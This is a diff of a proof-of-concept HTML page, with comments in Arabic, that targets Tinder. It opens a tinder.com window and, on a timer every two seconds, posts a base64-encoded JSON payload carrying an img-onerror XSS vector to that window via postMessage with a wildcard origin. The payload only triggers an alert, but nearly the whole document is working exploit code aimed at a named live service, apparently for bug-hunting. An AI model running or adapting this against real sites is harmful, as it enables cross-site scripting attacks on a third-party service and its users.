@@ -1,23 +1,27 @@
 <!DOCTYPE html>
 <html>
-  <head><title>PoC - Tinder XSS via window.open</title></head>
+  <head><title>PoC - Tinder XSS via Chat Context</title></head>
   <body>
-    <button onclick="exploit()">🚀 Launch XSS Exploit</button>
-
+    <button onclick="exploit()">🚀 Exploit XSS via Chat</button>
     <script>
       function exploit() {
-        const win = window.open("https://tinder.com", "_blank");
+        const win = window.open("https://tinder.com/app/recs");  // أو صفحة دردشة مباشرة
 
         const payload = {
           content: `<img src=x onerror=alert(document.domain)>`
         };
         const encoded = btoa(JSON.stringify(payload));
 
-        // إرسال البايلود بعد فترة قصيرة لضمان تحميل الصفحة
-        setTimeout(() => {
-          console.log("🚀 Sending XSS payload...");
+        const trySend = () => {
+          console.log("🚀 Sending...");
           win.postMessage(encoded, "*");
-        }, 3000);
+        };
+
+        // كرر الإرسال كل ثانيتين (في حال لم يظهر العنصر فورًا)
+        const interval = setInterval(trySend, 2000);
+        
+        // أوقف الإرسال بعد 30 ثانية
+        setTimeout(() => clearInterval(interval), 30000);
       }
     </script>
   </body>
